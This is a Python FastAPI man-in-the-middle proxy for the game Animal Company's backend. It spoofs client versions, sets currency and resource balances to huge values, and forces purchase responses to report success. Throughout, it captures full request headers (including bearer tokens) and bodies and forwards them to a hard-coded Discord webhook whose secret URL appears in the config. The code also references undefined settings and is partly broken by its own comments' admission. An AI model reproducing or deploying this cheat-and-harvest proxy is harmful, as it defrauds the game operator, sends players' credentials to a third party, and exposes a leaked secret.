from fastapi import FastAPI, Request, Response, WebSocket, HTTPException
from fastapi.responses import JSONResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
import requests
import json
import logging
import os
import random
import uuid
import asyncio
from datetime import datetime
from typing import Optional, Dict, Any
import urllib.parse
from websockets.client import connect as ws_connect

# Configuration
class Config:
    Backend = 'https://animalcompany.us-east1.nakamacloud.io'
    Logs = 'https://discordapp.com/api/webhooks/1379545349231874119/gA1MoCCKdsGYW10V2xu23-DZ7VzqazMFkC2fWKn3_pyAUv3JDaRXSM78VOaeojBhax0V'
    LOG_DIR = "request_logs"
    bug = False
    
    
    SPOOFED_HARD_CURRENCY = 4567834568
    SPOOFED_SOFT_CURRENCY = 3245843725894
    SPOOFED_RESEARCH_POINTS = 2345824359
    
    #omg real version spoofing 
    SPOOFED_VERSION = "1.24.2.1355"
    SPOOFED_CLIENT_USER_AGENT = "MetaQuest 1.24.2.1355_96d6b8b7"


app = FastAPI(title="mooncompanybackend", version="2.0")


app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

#logging thing idfk
logging.basicConfig(
    filename='proxy_requests.log', 
    level=logging.DEBUG, 
    format='%(asctime)s - %(levelname)s - %(message)s'
)
os.makedirs(Config.LOG_DIR, exist_ok=True)

class RequestLogger:
    """Handles request/response logging with full header capture"""
    
    @staticmethod
    def log_to_file(route: str, method: str, request_data: Any, response_data: Any, status_code: int):
        """Logs request/response data to JSON file with full headers"""
        safe_route = route.replace('/', '_').strip('_')
        filename = os.path.join(Config.LOG_DIR, f"{safe_route}.json")
        
        log_entry = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "method": method,
            "route": route,
            "request": request_data,
            "response": response_data,
            "status_code": status_code
        }
        
        try:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(json.dumps(log_entry, indent=2) + ",\n")
        except Exception as e:
            logging.error(f"Failed to log to file: {e}")

    @staticmethod
    def send_webhook(title: str, request_data: Dict, response_data: Dict = None, error: str = None):
        
        request_headers_str = ""
        if "headers" in request_data:
            request_headers_str = "\n".join([f"{k}: {v}" for k, v in request_data["headers"].items()])
        
        embeds = [{
            "title": "Request",
            "fields": [
                {"name": "Method", "value": request_data.get("method", "Unknown")},
                {"name": "URL", "value": request_data.get("url", "Unknown")},
                {"name": "Headers", "value": request_headers_str[:1000] if request_headers_str else "None"},
                {"name": "Body", "value": str(request_data.get("body", ""))[:800]}
            ]
        }]
        
        if response_data:
            
            response_headers_str = ""
            if "headers" in response_data:
                response_headers_str = "\n".join([f"{k}: {v}" for k, v in response_data["headers"].items()])
            
            embeds.append({
                "title": "Response",
                "fields": [
                    {"name": "Status", "value": str(response_data.get("status_code", "Unknown"))},
                    {"name": "Headers", "value": response_headers_str[:1000] if response_headers_str else "None"},
                    {"name": "Body", "value": str(response_data.get("body", ""))[:800]}
                ]
            })
        
        if error:
            embeds.append({
                "title": "Error",
                "fields": [{"name": "Message", "value": error}]
            })
        
        payload = {"content": title, "embeds": embeds}
        
        try:
            requests.post(Config.WEBHOOK_URL, json=payload, timeout=5)
        except Exception as e:
            logging.error(f"Webhook failed: {e}")

class OnlineStatusChecker:
    """Handles checking online status and inventory injection""" #ts does not work
    
    @staticmethod
    async def check_online_status(token: str):
        """Check if user is online using the token"""
        try:
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            
            response = requests.get(
                'https://animalcompany.us-east1.nakamacloud.io',
                headers=headers,
                timeout=10
            )
            
            response_text = response.text.lower()
            
            # Check for online status
            if 'online' in response_text or '"online": true' in response_text:
                logging.info("User is online, waiting 20 seconds before inventory injection")
                await asyncio.sleep(20)
                return True
            else:
                logging.info("User not online yet, checking again in 5 seconds")
                await asyncio.sleep(5)
                return False
                
        except Exception as e:
            logging.error(f"Failed to check online status: {e}")
            await asyncio.sleep(5)
            return False
    
    @staticmethod
    async def wait_for_online_and_inject(token: str): #ts does not work x2
        """Wait for user to be online, then inject inventory"""
        while True:
            is_online = await OnlineStatusChecker.check_online_status(token)
            if is_online:
                # User is online, inject inventory
                inventory_payload = GameDataSpoofer.create_inventory_payload()
                logging.info("Injecting inventory payload after online detection")
                # Send webhook notification about inventory injection
                RequestLogger.send_webhook(
                    "📦 Inventory Injected",
                    {"message": "User came online, inventory payload injected"},
                    {"inventory": inventory_payload}
                )
                break

class GameDataSpoofer:
    #ts does work but does not spawn items
    
    @staticmethod
    def create_inventory_payload():
        try:
            # Load econ items from game-data-prod folder
            with open("game-data-prod/econ_gameplay_items.json", "r") as f:
                data = json.load(f)
            item_ids = [item["id"] for item in data if "id" in item]
        except Exception as e:
            logging.error(f"Failed to load econ items: {e}")
            return {"error": "Could not load inventory items"}

        children = [{
            "itemID": item_ids[i % len(item_ids)],
            "scaleModifier": 100,
            "colorHue": 50,
            "colorSaturation": 50
        } for i in range(min(20, len(item_ids)))]

        return {
            "objects": [{
                "collection": "user_inventory",
                "key": "gameplay_loadout",
                "permission_read": 1,
                "permission_write": 1,
                "value": json.dumps({
                    "version": 1,
                    "back": {
                        "itemID": "item_backpack_large_base",
                        "scaleModifier": 120,
                        "colorHue": 50,
                        "colorSaturation": 50,
                        "children": children
                    }
                })
            }]
        }

    @staticmethod
    def spoof_wallet_data(wallet_data):
        #real ifn money
        if isinstance(wallet_data, str):
            try:
                wallet = json.loads(wallet_data)
            except:
                wallet = {}
        else:
            wallet = wallet_data or {}
            
        wallet.update({
            'hardCurrency': Config.SPOOFED_HARD_CURRENCY,
            'softCurrency': Config.SPOOFED_SOFT_CURRENCY,
            'researchPoints': Config.SPOOFED_RESEARCH_POINTS
        })
        
        return json.dumps(wallet) if isinstance(wallet_data, str) else wallet

    @staticmethod
    def spoof_mining_balance(payload_data):
        """Spoofs mining balance to give max resources""" 
        if isinstance(payload_data, str):
            try:
                data = json.loads(payload_data)
            except:
                data = {}
        else:
            data = payload_data or {}
            
        data.update({
            'hardCurrency': Config.SPOOFED_HARD_CURRENCY,
            'researchPoints': Config.SPOOFED_RESEARCH_POINTS
        })
        
        return json.dumps(data) if isinstance(payload_data, str) else data

    @staticmethod
    def spoof_version_data(data):
        """Spoofs version information in requests and responses"""
        if isinstance(data, str):
            try:
                json_data = json.loads(data)
            except:
                return data
        else:
            json_data = data
            
        #version spoof 
        if isinstance(json_data, dict):
            if 'vars' in json_data and isinstance(json_data['vars'], dict):
                if 'clientUserAgent' in json_data['vars']:
                    json_data['vars']['clientUserAgent'] = Config.SPOOFED_CLIENT_USER_AGENT
                    logging.info(f"Spoofed clientUserAgent to: {Config.SPOOFED_CLIENT_USER_AGENT}")
                
                # Also spoof any version fields
                if 'version' in json_data['vars']:
                    json_data['vars']['version'] = Config.SPOOFED_VERSION
                if 'clientVersion' in json_data['vars']:
                    json_data['vars']['clientVersion'] = Config.SPOOFED_VERSION
            
            # Spoof version in response data
            if 'version' in json_data:
                json_data['version'] = Config.SPOOFED_VERSION
            if 'clientVersion' in json_data:
                json_data['clientVersion'] = Config.SPOOFED_VERSION
            if 'gameVersion' in json_data:
                json_data['gameVersion'] = Config.SPOOFED_VERSION
        
        return json.dumps(json_data) if isinstance(data, str) else json_data

class ProxyHandler:
    @staticmethod
    def dict_from_headers(headers):
        return {k: v for k, v in headers.items()}
    @staticmethod
    async def forward_request(path: str, request: Request, spoof_function=None, spoof_request_body=False):
        method = request.method
        target_url = f"{Config.TARGET_BASE}/{path.lstrip('/')}"
        
        #logs thing again
        incoming_headers = ProxyHandler.dict_from_headers(request.headers)       
        headers = {
            k: v for k, v in request.headers.items()
            if k.lower() not in ['host', 'content-length', 'transfer-encoding']
        }
        headers["Host"] = "animalcompany.us-east1.nakamacloud.io"     
        try:
            data = await request.body()
        except Exception as e:
            logging.error(f"Failed to read request body: {e}")
            data = b""
        if spoof_request_body and data:
            try:
                original_body = data.decode('utf-8', errors='ignore')
                spoofed_body = GameDataSpoofer.spoof_version_data(original_body)
                data = spoofed_body.encode('utf-8')
                headers['Content-Length'] = str(len(data))
            except Exception as e:
                logging.error(f"Failed to spoof request body: {e}")
        
        request_info = {
            "method": method,
            "url": target_url,
            "headers": incoming_headers,  
            "body": data.decode('utf-8', errors='ignore')
        }
        
        try:
            
            response = requests.request(
                method=method,
                url=target_url,
                headers=headers,
                data=data,
                allow_redirects=False,
                timeout=30
            )
            
            #
            response_headers_dict = ProxyHandler.dict_from_headers(response.headers)
            
            
            forward_headers = {
                k: v for k, v in response.headers.items()
                if k.lower() not in ['content-encoding', 'transfer-encoding', 'connection']
            }
            
            #
            response_content = response.content
            if spoof_function and 'application/json' in response.headers.get('Content-Type', ''):
                try:
                    json_data = response.json()
                    spoofed_data = spoof_function(json_data)
                    response_content = json.dumps(spoofed_data).encode()
                    forward_headers['Content-Length'] = str(len(response_content))
                except Exception as e:
                    logging.error(f"Spoofing failed: {e}")
            
            
            response_info = {
                "status_code": response.status_code,
                "headers": response_headers_dict,  
                "body": response.text
            }
            
            
            RequestLogger.log_to_file(
                path, method, request_info, response_info, response.status_code
            )
            
            # Send webhook notification with headers
            RequestLogger.send_webhook(
                f"🔄 {method} {path}", 
                request_info, 
                response_info
            )
            
            return Response(
                content=response_content,
                status_code=response.status_code,
                headers=forward_headers,
                media_type=forward_headers.get("Content-Type")
            )
            
        except Exception as e:
            error_msg = f"Proxy Error: {str(e)}"
            logging.error(error_msg)
            
            RequestLogger.send_webhook(
                f"❌ Proxy Request Failed", 
                request_info, 
                error=error_msg
            )
            
            return JSONResponse(
                content={"error": "Proxy Error", "details": str(e)}, 
                status_code=502
            )


@app.middleware("http")
async def skip_ngrok_warning(request: Request, call_next):
    all_headers = ProxyHandler.dict_from_headers(request.headers)
    logging.info(f"Incoming request headers: {json.dumps(all_headers, indent=2)}")
    user_agent = request.headers.get("user-agent", "").lower()
    ngrok_skip = request.headers.get("ngrok-skip-browser-warning")

    if not ngrok_skip and "mozilla" in user_agent:
           return JSONResponse(
            content={"detail": "Set ngrok-skip-browser-warning header to bypass ngrok's browser warning."},
            status_code=403
        )
    response = await call_next(request)
    return response
@app.get("/data/game-data-prod.zip")
async def serve_game_data():
    """Serves game data ZIP file from game-data-prod folder"""
    zip_path = os.path.join("game-data-prod", "game-data-prod.zip")
    if os.path.exists(zip_path):
        return FileResponse(zip_path, filename="game-data-prod.zip", media_type='application/zip')
    return JSONResponse({"error": "game-data-prod.zip not found"}, status_code=404)
@app.get("/econ/items")
async def get_econ_items():
    """Serves economy items from game-data-prod folder"""
    try:
        with open("game-data-prod/econ_gameplay_items.json", "r") as f:
            data = json.load(f)
        return JSONResponse(content=data)
    except FileNotFoundError:
        return JSONResponse({"error": "econ_gameplay_items.json not found in game-data-prod folder"}, status_code=404)
    except Exception as e:
        return JSONResponse({"error": f"Failed to load items: {str(e)}"}, status_code=500)
@app.get("/version")
async def get_version():
    """Returns spoofed version information"""
    return JSONResponse({
        "version": Config.SPOOFED_VERSION,
        "clientVersion": Config.SPOOFED_VERSION,
        "gameVersion": Config.SPOOFED_VERSION,
        "clientUserAgent": Config.SPOOFED_CLIENT_USER_AGENT,
        "spoofed": True
    })
@app.get("/v2/version")
async def get_version_v2():
    """Returns spoofed version information (v2 endpoint)"""
    return JSONResponse({
        "version": Config.SPOOFED_VERSION,
        "clientVersion": Config.SPOOFED_VERSION,
        "gameVersion": Config.SPOOFED_VERSION,
        "clientUserAgent": Config.SPOOFED_CLIENT_USER_AGENT,
        "spoofed": True
    })
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket proxy for real-time game communication"""
    await websocket.accept()
    ws_headers = ProxyHandler.dict_from_headers(websocket.headers)
    logging.info(f"WebSocket connection headers: {json.dumps(ws_headers, indent=2)}")
    
    token = websocket.query_params.get("token")
    if not token:
        await websocket.close(code=1008)
        return
    
    try:
        encoded_token = urllib.parse.quote(token)
        target_ws_url = f"wss://animalcompany.us-east1.nakamacloud.io/ws?lang=en&status=True&token={encoded_token}"
        
        async with ws_connect(target_ws_url) as target_ws:
            async for message in target_ws:
                await websocket.send_text(message)
                
    except Exception as e:
        await websocket.send_text(f"WebSocket Error: {e}")
        await websocket.close()
@app.post('/v2/account/authenticate/custom')
async def authenticate_custom(request: Request):
    """Custom authentication with inventory spoofing and version spoofing"""
    if Config.MAINTENANCE_MODE:
        return Response(
            content="Maintenance mode - hi testing is over", 
            status_code=503, 
            media_type='text/plain'
        )
    
    def spoof_auth_response(response_data):
        if 'token' in response_data:
            
            token = response_data['token']
            asyncio.create_task(OnlineStatusChecker.wait_for_online_and_inject(token))
            
            
            response_data['inventory'] = GameDataSpoofer.create_inventory_payload()
        
        #
        response_data['version'] = Config.SPOOFED_VERSION
        response_data['clientVersion'] = Config.SPOOFED_VERSION
        
        return response_data

    
    return await ProxyHandler.forward_request(
        'v2/account/authenticate/custom', 
        request, 
        spoof_auth_response, 
        spoof_request_body=True
    )


@app.api_route('/v2/account', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
async def account_endpoint(request: Request):
    """Account endpoint with wallet spoofing and version spoofing"""
    def spoof_account_data(response_data):
        
        if 'user' in response_data and 'display_name' in response_data['user']:
            response_data['user']['display_name'] = 'moon_company:' + response_data['user']['display_name']
        
        
        if 'wallet' in response_data:
            response_data['wallet'] = GameDataSpoofer.spoof_wallet_data(response_data['wallet'])
        
        
        response_data['version'] = Config.SPOOFED_VERSION
        response_data['clientVersion'] = Config.SPOOFED_VERSION
        
        return response_data
    
    return await ProxyHandler.forward_request(
        'v2/account', 
        request, 
        spoof_account_data, 
        spoof_request_body=True
    )


@app.get('/v2/rpc/mining.balance')
async def mining_balance(request: Request):
    """Mining balance with unlimited resources"""
    def spoof_mining_data(response_data):
        if 'payload' in response_data:
            response_data['payload'] = GameDataSpoofer.spoof_mining_balance(response_data['payload'])
        return response_data
    
    return await ProxyHandler.forward_request('v2/rpc/mining.balance', request, spoof_mining_data)


@app.post('/v2/rpc/purchase.avatarItems')
async def purchase_avatar_items(request: Request):
    """Avatar item purchases - always succeed"""
    def spoof_purchase_response(response_data):
        response_data['succeeded'] = True
        response_data['errorCode'] = None
        return response_data
    
    return await ProxyHandler.forward_request('v2/rpc/purchase.avatarItems', request, spoof_purchase_response)



@app.api_route('/v2/rpc/clientBootstrap', methods=['GET', 'POST'])
async def client_bootstrap(request: Request):
    """Client bootstrap with version spoofing"""
    def spoof_bootstrap_response(response_data):
       
        if 'payload' in response_data:
            try:
                if isinstance(response_data['payload'], str):
                    payload = json.loads(response_data['payload'])
                else:
                    payload = response_data['payload']
                
                
                payload['version'] = Config.SPOOFED_VERSION
                payload['clientVersion'] = Config.SPOOFED_VERSION
                payload['gameVersion'] = Config.SPOOFED_VERSION
                payload['minVersion'] = Config.SPOOFED_VERSION
                payload['requiredVersion'] = Config.SPOOFED_VERSION
                
                response_data['payload'] = json.dumps(payload) if isinstance(response_data['payload'], str) else payload
            except Exception as e:
                logging.error(f"Failed to spoof bootstrap payload: {e}")
        
        return response_data
    
    return await ProxyHandler.forward_request(
        'v2/rpc/clientBootstrap', 
        request, 
        spoof_bootstrap_response, 
        spoof_request_body=True
    )


#Links
FORWARD_ENDPOINTS = [
    '/v2/rpc/attest.start',
    '/v2/rpc/avatar.update',
    '/v2/notification',
    '/v2/rpc/purchase.stashUpgrade',
    '/v2/rpc/updateWalletSoftCurrency',
    '/v2/account/session/refresh',
    '/v2/account/authenticate/device',
    '/v2/storage',
    '/v2/rpc/purchase.list',
    '/v2/storage/econ_avatar_items',
    '/v2/storage/econ_products',
    '/v2/storage/econ_gameplay_items',
    '/v2/storage/econ_research_nodes',
    '/v2/user',
    '/v2/friend',
    '/v2/friend/block'
]


# Create dynamic routes for all forward endpoints
for endpoint in FORWARD_ENDPOINTS:
    @app.api_route(endpoint, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    async def forward_generic(request: Request, endpoint=endpoint):
        query_params = str(request.url.query)
        path = f"{endpoint.lstrip('/')}?{query_params}" if query_params else endpoint.lstrip('/')
        return await ProxyHandler.forward_request(path, request)

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "running",
        "proxy_target": Config.TARGET_BASE,
        "spoofing": "active",
        "maintenance": Config.MAINTENANCE_MODE,
        "version_spoofing": Config.SPOOFED_VERSION,
        "client_user_agent": Config.SPOOFED_CLIENT_USER_AGENT,
        "header_logging": "enabled",
        "online_checking": "enabled",
        "timestamp": datetime.utcnow().isoformat()
    }

if __name__ == '__main__':
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=7000)